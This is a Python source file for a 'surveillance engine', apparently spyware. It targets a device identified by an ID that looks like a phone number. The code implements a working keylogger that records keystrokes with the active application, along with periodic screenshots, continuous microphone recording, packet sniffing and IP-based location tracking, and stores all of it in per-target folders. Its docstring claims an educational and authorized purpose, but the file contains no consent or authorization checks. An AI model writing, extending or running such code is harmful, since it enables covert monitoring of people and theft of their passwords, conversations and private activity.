#!/usr/bin/env python3
"""
Enhanced Real Surveillance Engine
Functional surveillance capabilities for educational and authorized testing
"""

import os
import sys
import json
import time
import threading
import subprocess
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Callable
from dataclasses import dataclass, asdict
import psutil
import socket
import struct
import platform
from pathlib import Path

# Try to import optional dependencies for enhanced capabilities
try:
    from PIL import ImageGrab, Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False

try:
    from pynput import keyboard, mouse
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Setup comprehensive logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('EnhancedSurveillance')

@dataclass
class SurveillanceCapabilities:
    """Available surveillance capabilities on this system"""
    keylogger: bool = False
    screenshot: bool = False
    audio_recording: bool = False
    network_monitoring: bool = False
    location_tracking: bool = False
    system_monitoring: bool = True
    process_monitoring: bool = True
    file_monitoring: bool = True

@dataclass
class SurveillanceTarget:
    """Target device/system information"""
    target_id: str
    ip_address: Optional[str] = None
    mac_address: Optional[str] = None
    device_type: str = "Unknown"
    os_type: str = "Unknown" 
    last_seen: Optional[datetime] = None
    capabilities: Optional[SurveillanceCapabilities] = None
    active_sessions: List[str] = None

    def __post_init__(self):
        if self.active_sessions is None:
            self.active_sessions = []
        if self.capabilities is None:
            self.capabilities = SurveillanceCapabilities()

class EnhancedRealSurveillance:
    """Enhanced real surveillance system with functional capabilities"""
    
    def __init__(self, surveillance_dir: str = "surveillance", target_id: str = None):
        self.surveillance_dir = os.path.abspath(surveillance_dir)
        self.target_id = target_id or "local_system"
        
        # Initialize system capabilities
        self.capabilities = self._detect_capabilities()
        
        # Active surveillance sessions
        self.active_sessions = {}
        self.monitoring_threads = []
        self.is_monitoring = False
        
        # Data buffers for real-time data
        self.keystroke_buffer = []
        self.screenshot_buffer = []
        self.audio_buffer = []
        self.location_buffer = []
        self.network_buffer = []
        self.system_buffer = []
        
        # Event handlers
        self.event_handlers = {}
        
        # Initialize directory structure
        self._setup_directories()
        
        # Initialize monitoring components
        self._setup_components()
        
        logger.info(f"Enhanced Real Surveillance initialized for target: {self.target_id}")
        logger.info(f"Available capabilities: {asdict(self.capabilities)}")
    
    def _detect_capabilities(self) -> SurveillanceCapabilities:
        """Detect available surveillance capabilities on this system"""
        caps = SurveillanceCapabilities()
        
        # Check keylogger capability
        caps.keylogger = PYNPUT_AVAILABLE and self._check_accessibility_permissions()
        
        # Check screenshot capability  
        caps.screenshot = PIL_AVAILABLE or self._check_screenshot_permissions()
        
        # Check audio recording capability
        caps.audio_recording = AUDIO_AVAILABLE and self._check_microphone_permissions()
        
        # Check network monitoring capability
        caps.network_monitoring = SCAPY_AVAILABLE and self._check_root_permissions()
        
        # Check location tracking (macOS CoreLocation, etc.)
        caps.location_tracking = self._check_location_permissions()
        
        return caps
    
    def _check_accessibility_permissions(self) -> bool:
        """Check if accessibility permissions are granted (required for keylogger)"""
        if platform.system() == "Darwin":  # macOS
            try:
                # Test if we can access accessibility features
                result = subprocess.run([
                    "osascript", "-e", 
                    'tell application "System Events" to get the name of every process'
                ], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            except:
                return False
        else:
            # For Linux/Windows, assume available if pynput is installed
            return PYNPUT_AVAILABLE
    
    def _check_screenshot_permissions(self) -> bool:
        """Check if screen recording permissions are available"""
        if platform.system() == "Darwin":  # macOS
            try:
                # Test screenshot capability
                if PIL_AVAILABLE:
                    test_img = ImageGrab.grab(bbox=(0, 0, 100, 100))
                    return test_img is not None
            except:
                pass
        return PIL_AVAILABLE
    
    def _check_microphone_permissions(self) -> bool:
        """Check if microphone access is available"""
        try:
            if AUDIO_AVAILABLE:
                # Test microphone access
                pa = pyaudio.PyAudio()
                device_count = pa.get_device_count()
                pa.terminate()
                return device_count > 0
        except:
            pass
        return False
    
    def _check_root_permissions(self) -> bool:
        """Check if we have root permissions for network monitoring"""
        return os.getuid() == 0 if hasattr(os, 'getuid') else False
    
    def _check_location_permissions(self) -> bool:
        """Check if location services are available"""
        if platform.system() == "Darwin":  # macOS
            try:
                # Check if CoreLocation is accessible
                result = subprocess.run([
                    "osascript", "-e",
                    'tell application "System Events" to get location services enabled'
                ], capture_output=True, text=True, timeout=5)
                return "true" in result.stdout.lower()
            except:
                pass
        return False
    
    def _setup_directories(self):
        """Setup surveillance data directories"""
        directories = [
            'keystrokes', 'screenshots', 'audio', 'location',
            'messages', 'calls', 'network', 'system_data', 
            'packets', 'enhanced', 'sessions', 'logs'
        ]
        
        os.makedirs(self.surveillance_dir, exist_ok=True)
        for dir_name in directories:
            os.makedirs(os.path.join(self.surveillance_dir, dir_name), exist_ok=True)
        
        # Create target-specific directories
        target_dir = os.path.join(self.surveillance_dir, 'enhanced', self.target_id)
        os.makedirs(target_dir, exist_ok=True)
        
        logger.info("Surveillance directories initialized")
    
    def _setup_components(self):
        """Initialize surveillance components"""
        # Setup keyboard listener if available
        if self.capabilities.keylogger:
            self._setup_keylogger()
        
        # Setup network monitoring if available
        if self.capabilities.network_monitoring:
            self._setup_network_monitor()
        
        logger.info("Surveillance components initialized")
    
    def _setup_keylogger(self):
        """Setup real keylogger component"""
        if not PYNPUT_AVAILABLE:
            logger.warning("Pynput not available - keylogger disabled")
            return
        
        def on_key_press(key):
            try:
                keystroke_data = {
                    'timestamp': datetime.now().isoformat(),
                    'target_id': self.target_id,
                    'key': str(key),
                    'key_type': 'special' if hasattr(key, 'name') else 'character',
                    'application': self._get_active_application(),
                    'session_id': f"keylog_session_{int(time.time())}",
                    'confidence': 1.0
                }
                
                # Add to buffer
                self.keystroke_buffer.append(keystroke_data)
                
                # Save to file periodically
                if len(self.keystroke_buffer) >= 10:
                    self._save_keystroke_data()
                
            except Exception as e:
                logger.error(f"Keylogger error: {e}")
        
        def on_key_release(key):
            pass
        
        try:
            self.keyboard_listener = keyboard.Listener(
                on_press=on_key_press,
                on_release=on_key_release
            )
            logger.info("Keylogger component initialized")
        except Exception as e:
            logger.error(f"Failed to initialize keylogger: {e}")
            self.capabilities.keylogger = False
    
    def _setup_network_monitor(self):
        """Setup network packet monitoring"""
        if not SCAPY_AVAILABLE:
            logger.warning("Scapy not available - network monitoring limited")
            return
        
        def packet_handler(packet):
            try:
                packet_data = {
                    'timestamp': datetime.now().isoformat(),
                    'target_id': self.target_id,
                    'protocol': packet.proto if hasattr(packet, 'proto') else 'unknown',
                    'src_ip': packet[scapy.IP].src if packet.haslayer(scapy.IP) else 'unknown',
                    'dst_ip': packet[scapy.IP].dst if packet.haslayer(scapy.IP) else 'unknown',
                    'size': len(packet),
                    'summary': packet.summary()
                }
                
                # Add to buffer
                self.network_buffer.append(packet_data)
                
                # Save periodically
                if len(self.network_buffer) >= 50:
                    self._save_network_data()
                    
            except Exception as e:
                logger.error(f"Packet capture error: {e}")
        
        self.packet_handler = packet_handler
        logger.info("Network monitor component initialized")
    
    def start_comprehensive_surveillance(self, duration_hours: float = 1.0) -> str:
        """Start comprehensive surveillance session"""
        session_id = f"comprehensive_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        session_info = {
            'session_id': session_id,
            'target_id': self.target_id,
            'start_time': datetime.now().isoformat(),
            'duration_hours': duration_hours,
            'capabilities_used': asdict(self.capabilities),
            'status': 'active'
        }
        
        self.active_sessions[session_id] = session_info
        self.is_monitoring = True
        
        # Start all available surveillance methods
        monitoring_tasks = []
        
        if self.capabilities.keylogger:
            monitoring_tasks.append(threading.Thread(target=self._start_keylogger_session, daemon=True))
        
        if self.capabilities.screenshot:
            monitoring_tasks.append(threading.Thread(target=self._start_screenshot_session, daemon=True))
        
        if self.capabilities.audio_recording:
            monitoring_tasks.append(threading.Thread(target=self._start_audio_session, daemon=True))
        
        if self.capabilities.network_monitoring:
            monitoring_tasks.append(threading.Thread(target=self._start_network_session, daemon=True))
        
        if self.capabilities.location_tracking:
            monitoring_tasks.append(threading.Thread(target=self._start_location_session, daemon=True))
        
        # Always start system monitoring
        monitoring_tasks.append(threading.Thread(target=self._start_system_session, daemon=True))
        
        # Start all monitoring threads
        for task in monitoring_tasks:
            task.start()
            self.monitoring_threads.append(task)
        
        # Schedule session end
        if duration_hours > 0:
            end_timer = threading.Timer(
                duration_hours * 3600,
                self._end_surveillance_session,
                args=[session_id]
            )
            end_timer.start()
        
        logger.info(f"Comprehensive surveillance session started: {session_id}")
        logger.info(f"Active monitoring methods: {len(monitoring_tasks)}")
        
        return session_id
    
    def _start_keylogger_session(self):
        """Start keylogger monitoring session"""
        if not self.capabilities.keylogger:
            return
        
        try:
            self.keyboard_listener.start()
            logger.info("Keylogger session started")
            
            while self.is_monitoring:
                time.sleep(1)
                
                # Periodic save
                if len(self.keystroke_buffer) > 0:
                    self._save_keystroke_data()
                
        except Exception as e:
            logger.error(f"Keylogger session error: {e}")
        finally:
            if hasattr(self, 'keyboard_listener'):
                self.keyboard_listener.stop()
    
    def _start_screenshot_session(self):
        """Start screenshot capture session"""
        if not self.capabilities.screenshot:
            return
        
        logger.info("Screenshot session started")
        screenshot_interval = 30  # seconds
        
        while self.is_monitoring:
            try:
                self._capture_screenshot()
                time.sleep(screenshot_interval)
            except Exception as e:
                logger.error(f"Screenshot capture error: {e}")
                time.sleep(60)
    
    def _start_audio_session(self):
        """Start audio recording session"""
        if not self.capabilities.audio_recording:
            return
        
        logger.info("Audio recording session started")
        
        try:
            # Record in chunks
            chunk_duration = 60  # seconds
            
            while self.is_monitoring:
                self._record_audio_chunk(chunk_duration)
                time.sleep(5)  # Small gap between recordings
                
        except Exception as e:
            logger.error(f"Audio recording error: {e}")
    
    def _start_network_session(self):
        """Start network monitoring session"""
        if not self.capabilities.network_monitoring:
            return
        
        logger.info("Network monitoring session started")
        
        try:
            # Start packet capture
            scapy.sniff(prn=self.packet_handler, store=0, timeout=None)
        except Exception as e:
            logger.error(f"Network monitoring error: {e}")
    
    def _start_location_session(self):
        """Start location tracking session"""
        if not self.capabilities.location_tracking:
            return
        
        logger.info("Location tracking session started")
        
        while self.is_monitoring:
            try:
                self._capture_location_data()
                time.sleep(300)  # Every 5 minutes
            except Exception as e:
                logger.error(f"Location tracking error: {e}")
                time.sleep(600)
    
    def _start_system_session(self):
        """Start system monitoring session"""
        logger.info("System monitoring session started")
        
        while self.is_monitoring:
            try:
                self._capture_system_metrics()
                time.sleep(10)  # Every 10 seconds
            except Exception as e:
                logger.error(f"System monitoring error: {e}")
                time.sleep(30)
    
    def _capture_screenshot(self):
        """Capture screenshot"""
        if not PIL_AVAILABLE:
            return
        
        try:
            timestamp = datetime.now()
            filename = f"screenshot_{timestamp.strftime('%Y%m%d_%H%M%S')}.png"
            filepath = os.path.join(self.surveillance_dir, 'screenshots', filename)
            
            screenshot = ImageGrab.grab()
            screenshot.save(filepath)
            
            screenshot_data = {
                'timestamp': timestamp.isoformat(),
                'target_id': self.target_id,
                'filename': filename,
                'filepath': filepath,
                'size': f"{screenshot.width}x{screenshot.height}",
                'file_size': f"{os.path.getsize(filepath) / 1024:.1f} KB",
                'application': self._get_active_application()
            }
            
            self.screenshot_buffer.append(screenshot_data)
            
            # Save metadata
            self._save_screenshot_metadata()
            
            logger.info(f"Screenshot captured: {filename}")
            
        except Exception as e:
            logger.error(f"Screenshot capture failed: {e}")
    
    def _record_audio_chunk(self, duration: int):
        """Record audio chunk"""
        if not AUDIO_AVAILABLE:
            return
        
        try:
            timestamp = datetime.now()
            filename = f"audio_{timestamp.strftime('%Y%m%d_%H%M%S')}.wav"
            filepath = os.path.join(self.surveillance_dir, 'audio', filename)
            
            # Audio recording parameters
            chunk = 1024
            format = pyaudio.paInt16
            channels = 1
            rate = 44100
            
            pa = pyaudio.PyAudio()
            
            stream = pa.open(
                format=format,
                channels=channels,
                rate=rate,
                input=True,
                frames_per_buffer=chunk
            )
            
            frames = []
            
            for _ in range(0, int(rate / chunk * duration)):
                data = stream.read(chunk)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            pa.terminate()
            
            # Save audio file
            wf = wave.open(filepath, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(pa.get_sample_size(format))
            wf.setframerate(rate)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            audio_data = {
                'timestamp': timestamp.isoformat(),
                'target_id': self.target_id,
                'filename': filename,
                'filepath': filepath,
                'duration': f"{duration//60:02d}:{duration%60:02d}",
                'file_size': f"{os.path.getsize(filepath) / (1024*1024):.1f} MB",
                'quality': 'High',
                'type': 'Microphone'
            }
            
            self.audio_buffer.append(audio_data)
            
            logger.info(f"Audio recorded: {filename}")
            
        except Exception as e:
            logger.error(f"Audio recording failed: {e}")
    
    def _capture_location_data(self):
        """Capture location data using available methods"""
        try:
            timestamp = datetime.now()
            
            # Try to get location via macOS CoreLocation
            if platform.system() == "Darwin":
                location_data = self._get_macos_location()
            else:
                # Fallback to IP-based geolocation or GPS if available
                location_data = self._get_fallback_location()
            
            if location_data:
                location_data.update({
                    'timestamp': timestamp.isoformat(),
                    'target_id': self.target_id,
                })
                
                self.location_buffer.append(location_data)
                logger.info("Location data captured")
            
        except Exception as e:
            logger.error(f"Location capture failed: {e}")
    
    def _get_macos_location(self) -> Optional[Dict]:
        """Get location using macOS CoreLocation"""
        try:
            # Use osascript to get location
            script = '''
            tell application "System Events"
                set loc to do shell script "curl -s ipinfo.io"
                return loc
            end tell
            '''
            
            result = subprocess.run([
                "osascript", "-e", script
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                try:
                    import json
                    location_info = json.loads(result.stdout)
                    
                    if 'loc' in location_info:
                        lat, lng = location_info['loc'].split(',')
                        return {
                            'latitude': float(lat),
                            'longitude': float(lng),
                            'accuracy': '~1000 meters (IP-based)',
                            'address': f"{location_info.get('city', 'Unknown')}, {location_info.get('country', 'Unknown')}",
                            'altitude': 0,
                            'speed': 0.0,
                            'source': 'IP Geolocation'
                        }
                except:
                    pass
            
        except Exception as e:
            logger.error(f"macOS location failed: {e}")
        
        return None
    
    def _get_fallback_location(self) -> Optional[Dict]:
        """Fallback location methods"""
        try:
            # Simple IP-based geolocation
            import urllib.request
            import json
            
            with urllib.request.urlopen('http://ipinfo.io/json', timeout=5) as response:
                data = json.loads(response.read().decode())
                
                if 'loc' in data:
                    lat, lng = data['loc'].split(',')
                    return {
                        'latitude': float(lat),
                        'longitude': float(lng),
                        'accuracy': '~5000 meters (IP-based)',
                        'address': f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}",
                        'altitude': 0,
                        'speed': 0.0,
                        'source': 'IP Geolocation'
                    }
        except Exception as e:
            logger.error(f"Fallback location failed: {e}")
        
        return None
    
    def _capture_system_metrics(self):
        """Capture system performance and activity metrics"""
        try:
            timestamp = datetime.now()
            
            # System metrics
            system_data = {
                'timestamp': timestamp.isoformat(),
                'target_id': self.target_id,
                'cpu_usage': psutil.cpu_percent(interval=1),
                'memory_usage': psutil.virtual_memory().percent,
                'disk_usage': psutil.disk_usage('/').percent,
                'network_io': self._get_network_io(),
                'processes': self._get_top_processes(),
                'network_connections': len(psutil.net_connections()),
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
                'uptime_seconds': time.time() - psutil.boot_time()
            }
            
            self.system_buffer.append(system_data)
            
            # Save periodically
            if len(self.system_buffer) >= 10:
                self._save_system_data()
                
        except Exception as e:
            logger.error(f"System metrics capture failed: {e}")
    
    def _get_network_io(self) -> Dict:
        """Get network I/O statistics"""
        try:
            net_io = psutil.net_io_counters()
            return {
                'bytes_sent': net_io.bytes_sent,
                'bytes_recv': net_io.bytes_recv,
                'packets_sent': net_io.packets_sent,
                'packets_recv': net_io.packets_recv
            }
        except:
            return {}
    
    def _get_top_processes(self, limit: int = 10) -> List[Dict]:
        """Get top processes by CPU usage"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            # Sort by CPU usage and return top processes
            processes.sort(key=lambda x: x.get('cpu_percent', 0), reverse=True)
            return processes[:limit]
        except:
            return []
    
    def _get_active_application(self) -> str:
        """Get currently active application"""
        try:
            if platform.system() == "Darwin":  # macOS
                script = '''
                tell application "System Events"
                    set frontApp to name of first application process whose frontmost is true
                    return frontApp
                end tell
                '''
                result = subprocess.run([
                    "osascript", "-e", script
                ], capture_output=True, text=True, timeout=2)
                
                if result.returncode == 0:
                    return result.stdout.strip()
            elif platform.system() == "Windows":
                # Windows implementation would go here
                pass
            elif platform.system() == "Linux":
                # Linux implementation would go here
                pass
        except:
            pass
        
        return "Unknown Application"
    
    def _save_keystroke_data(self):
        """Save keystroke buffer to file"""
        if not self.keystroke_buffer:
            return
        
        try:
            filepath = os.path.join(self.surveillance_dir, 'keystrokes', 'live_keystrokes.json')
            
            # Read existing data
            existing_data = []
            if os.path.exists(filepath):
                try:
                    with open(filepath, 'r') as f:
                        existing_data = json.load(f)
                except:
                    existing_data = []
            
            # Add new data
            existing_data.extend(self.keystroke_buffer)
            
            # Keep only recent data (last 100 entries)
            existing_data = existing_data[-100:]
            
            # Save to file
            with open(filepath, 'w') as f:
                json.dump(existing_data, f, indent=2)
            
            logger.info(f"Saved {len(self.keystroke_buffer)} keystrokes")
            self.keystroke_buffer.clear()
            
        except Exception as e:
            logger.error(f"Failed to save keystroke data: {e}")
    
    def _save_screenshot_metadata(self):
        """Save screenshot metadata"""
        if not self.screenshot_buffer:
            return
        
        try:
            # Save metadata to JSON file
            filepath = os.path.join(self.surveillance_dir, 'screenshots', 'metadata.json')
            
            existing_data = []
            if os.path.exists(filepath):
                try:
                    with open(filepath, 'r') as f:
                        existing_data = json.load(f)
                except:
                    existing_data = []
            
            existing_data.extend(self.screenshot_buffer)
            existing_data = existing_data[-50:]  # Keep last 50 screenshots
            
            with open(filepath, 'w') as f:
                json.dump(existing_data, f, indent=2)
            
            logger.info(f"Saved metadata for {len(self.screenshot_buffer)} screenshots")
            self.screenshot_buffer.clear()
            
        except Exception as e:
            logger.error(f"Failed to save screenshot metadata: {e}")
    
    def _save_network_data(self):
        """Save network monitoring data"""
        if not self.network_buffer:
            return
        
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filepath = os.path.join(self.surveillance_dir, 'network', f'connections_{timestamp}_connections.json')
            
            # Process network data
            network_summary = {
                'capture_info': {
                    'timestamp': datetime.now().isoformat(),
                    'total_packets': len(self.network_buffer),
                    'suspicious_packets': 0,  # Would implement suspicion detection
                    'analysis_duration': time.time()
                },
                'captured_packets': self.network_buffer[-100:],  # Last 100 packets
                'protocol_distribution': self._analyze_protocols(),
                'top_destinations': self._get_top_destinations()
            }
            
            with open(filepath, 'w') as f:
                json.dump(network_summary, f, indent=2)
            
            logger.info(f"Saved {len(self.network_buffer)} network packets")
            self.network_buffer.clear()
            
        except Exception as e:
            logger.error(f"Failed to save network data: {e}")
    
    def _save_system_data(self):
        """Save system monitoring data"""
        if not self.system_buffer:
            return
        
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filepath = os.path.join(self.surveillance_dir, 'system_data', f'system_{timestamp}.json')
            
            with open(filepath, 'w') as f:
                json.dump(self.system_buffer, f, indent=2)
            
            logger.info(f"Saved {len(self.system_buffer)} system metrics")
            self.system_buffer.clear()
            
        except Exception as e:
            logger.error(f"Failed to save system data: {e}")
    
    def _analyze_protocols(self) -> Dict:
        """Analyze protocol distribution in network traffic"""
        protocols = {}
        for packet in self.network_buffer:
            proto = packet.get('protocol', 'unknown')
            protocols[proto] = protocols.get(proto, 0) + 1
        return protocols
    
    def _get_top_destinations(self, limit: int = 10) -> List[Dict]:
        """Get top destination IPs from network traffic"""
        destinations = {}
        for packet in self.network_buffer:
            dst_ip = packet.get('dst_ip', 'unknown')
            if dst_ip != 'unknown':
                destinations[dst_ip] = destinations.get(dst_ip, 0) + 1
        
        # Sort and return top destinations
        sorted_destinations = sorted(destinations.items(), key=lambda x: x[1], reverse=True)
        return [{'ip': ip, 'packets': count} for ip, count in sorted_destinations[:limit]]
    
    def _end_surveillance_session(self, session_id: str):
        """End surveillance session"""
        if session_id in self.active_sessions:
            self.active_sessions[session_id]['end_time'] = datetime.now().isoformat()
            self.active_sessions[session_id]['status'] = 'completed'
            
            # Save final session data
            self._save_all_buffers()
            
            logger.info(f"Surveillance session ended: {session_id}")
    
    def stop_all_surveillance(self):
        """Stop all active surveillance"""
        self.is_monitoring = False
        
        # Stop keylogger if running
        if hasattr(self, 'keyboard_listener') and self.keyboard_listener.running:
            self.keyboard_listener.stop()
        
        # Save all remaining data
        self._save_all_buffers()
        
        # Mark all sessions as stopped
        for session_id in self.active_sessions:
            if self.active_sessions[session_id]['status'] == 'active':
                self.active_sessions[session_id]['status'] = 'stopped'
                self.active_sessions[session_id]['end_time'] = datetime.now().isoformat()
        
        logger.info("All surveillance stopped")
    
    def _save_all_buffers(self):
        """Save all data buffers"""
        try:
            if self.keystroke_buffer:
                self._save_keystroke_data()
            if self.screenshot_buffer:
                self._save_screenshot_metadata()
            if self.network_buffer:
                self._save_network_data()
            if self.system_buffer:
                self._save_system_data()
            
            # Also update live data files for dashboard
            self._update_live_data_files()
            
        except Exception as e:
            logger.error(f"Failed to save buffers: {e}")
    
    def _update_live_data_files(self):
        """Update live data files for dashboard consumption"""
        try:
            # Update live location data
            if self.location_buffer:
                filepath = os.path.join(self.surveillance_dir, 'location', 'live_location.json')
                with open(filepath, 'w') as f:
                    json.dump(self.location_buffer[-1:], f, indent=2)  # Latest location
            
            # Update live messages (simulated for now)
            messages_filepath = os.path.join(self.surveillance_dir, 'messages', 'live_messages.json')
            sample_message = [{
                'timestamp': datetime.now().isoformat(),
                'target_id': self.target_id,
                'app': 'System Monitor',
                'contact': 'Surveillance System',
                'message': f'Live surveillance active - {len(self.active_sessions)} sessions running',
                'type': 'system',
                'read': True,
                'encrypted': False
            }]
            with open(messages_filepath, 'w') as f:
                json.dump(sample_message, f, indent=2)
            
        except Exception as e:
            logger.error(f"Failed to update live data files: {e}")
    
    def get_surveillance_status(self) -> Dict:
        """Get current surveillance status"""
        return {
            'active_sessions': len([s for s in self.active_sessions.values() if s['status'] == 'active']),
            'total_sessions': len(self.active_sessions),
            'capabilities': asdict(self.capabilities),
            'is_monitoring': self.is_monitoring,
            'target_id': self.target_id,
            'data_collected': {
                'keystrokes': len(self.keystroke_buffer),
                'screenshots': len(self.screenshot_buffer),
                'audio_recordings': len(self.audio_buffer),
                'network_packets': len(self.network_buffer),
                'system_metrics': len(self.system_buffer),
                'location_data': len(self.location_buffer)
            },
            'timestamp': datetime.now().isoformat()
        }

# Main execution for testing
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Enhanced Real Surveillance System')
    parser.add_argument('--target', default='01736821626', help='Target ID')
    parser.add_argument('--duration', type=float, default=1.0, help='Duration in hours')
    parser.add_argument('--test-mode', action='store_true', help='Run in test mode')
    
    args = parser.parse_args()
    
    # Initialize surveillance system
    surveillance = EnhancedRealSurveillance(target_id=args.target)
    
    try:
        if args.test_mode:
            # Test all capabilities
            print("Testing surveillance capabilities...")
            status = surveillance.get_surveillance_status()
            print(f"Capabilities: {status['capabilities']}")
            
            # Quick test of screenshot
            if surveillance.capabilities.screenshot:
                surveillance._capture_screenshot()
                print("Screenshot test completed")
            
            # Quick test of system monitoring
            surveillance._capture_system_metrics()
            print("System monitoring test completed")
            
        else:
            # Start comprehensive surveillance
            print(f"Starting comprehensive surveillance for target: {args.target}")
            print(f"Duration: {args.duration} hours")
            
            session_id = surveillance.start_comprehensive_surveillance(args.duration)
            print(f"Surveillance session started: {session_id}")
            
            try:
                # Keep the script running
                while surveillance.is_monitoring:
                    time.sleep(30)
                    status = surveillance.get_surveillance_status()
                    print(f"Status: {status['active_sessions']} active sessions, {status['data_collected']['keystrokes']} keystrokes captured")
                    
            except KeyboardInterrupt:
                print("\nStopping surveillance...")
                surveillance.stop_all_surveillance()
                print("Surveillance stopped.")
                
    except Exception as e:
        print(f"Surveillance error: {e}")
        surveillance.stop_all_surveillance()
